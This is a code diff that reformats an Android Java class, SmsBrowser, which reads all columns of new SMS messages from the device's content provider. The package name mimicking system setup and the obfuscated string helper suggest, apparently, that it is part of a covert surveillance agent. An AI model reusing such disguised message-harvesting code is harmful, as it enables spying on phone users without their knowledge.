@@ -9,15 +9,15 @@
 
 package com.android.syssetup.module.message;
 
-import java.util.ArrayList;
-
 import android.database.Cursor;
 import android.net.Uri;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
+
+import java.util.ArrayList;
 
 public class SmsBrowser {
 	private static final String TAG = "SmsBrowser"; //$NON-NLS-1$
@@ -25,9 +25,8 @@ public class SmsBrowser {
 	private static final int MESSAGE_TYPE_SENT = 2;
 
 	private final ArrayList<Sms> list;
-
-	private int id;
 	int maxId = 0;
+	private int id;
 
 	public SmsBrowser() {
 		list = new ArrayList<Sms>();
@@ -49,7 +48,7 @@ public class SmsBrowser {
 			Check.log(TAG + " (parse), lastManagedId: " + lastManagedId);
 		}
 
-		final String[] projection = new String[] { "*" };
+		final String[] projection = new String[]{"*"};
 		final Cursor c = Status.getAppContext().getContentResolver()
 				.query(Uri.parse(content), projection, "_id>" + lastManagedId, null, "_id");
 
